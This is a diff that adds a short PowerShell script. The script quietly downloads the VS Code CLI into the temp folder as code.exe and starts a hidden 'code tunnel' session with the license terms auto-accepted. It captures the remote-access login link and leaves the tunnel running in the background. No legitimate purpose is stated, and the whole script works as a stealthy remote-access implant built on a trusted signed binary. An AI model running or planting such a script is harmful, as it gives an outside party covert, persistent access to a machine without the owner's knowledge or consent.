@@ -1,0 +1,48 @@
+$url = "https://vscode.download.prss.microsoft.com/dbazure/download/stable/c9d77990917f3102ada88be140d28b038d1dd7c7/vscode_cli_win32_x64_cli.zip"
+$tunzip = "$env:tmp\tun.zip"
+$tun = "$env:tmp\code.exe"
+$arguments = "tunnel --accept-server-license-terms"
+if (-not(Test-Path -Path $tun -ErrorAction SilentlyContinue)){
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($url, $tunzip)
+    Expand-Archive -Path $tunzip -DestinationPath $env:tmp -Force
+}
+
+
+$outputBuilder = New-Object System.Text.StringBuilder
+$pinfo = New-Object System.Diagnostics.ProcessStartInfo
+$pinfo.FileName = $tun
+$pinfo.Arguments = $arguments
+$pinfo.UseShellExecute = $false
+$pinfo.RedirectStandardOutput = $true
+$pinfo.RedirectStandardError = $true
+$pinfo.CreateNoWindow = $true
+
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo = $pinfo
+
+# 3. Define the event logic for capturing output
+$global:Cat = $true
+$outEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action {
+    $line = $EventArgs.Data
+    if ($line) {
+        # Accumulate the output
+        $null = $Event.MessageData.Append("$line`n")
+        
+        # Check if "Done!" exists in the current line
+        if (($line -match "Open this link") -or ($line -match "To grant access")) {
+            Write-Host "[!] 'Done!' detected. Saving current buffer to file..."
+            $cat = $false
+            $currentOutput = $Event.MessageData.ToString()
+            Write-Host "$currentOutput"
+            $global:Cat = $false
+        }
+    }
+} -MessageData $outputBuilder
+# 4. Start the process
+$process.Start() | Out-Null
+$process.BeginOutputReadLine()
+$process.BeginErrorReadLine()
+while($global:Cat){Start-Sleep 1}
+Unregister-Event -SourceIdentifier $outEvent.Name
+Write-Host "Monitoring stopped. The process (PID: $($process.Id)) is still running."
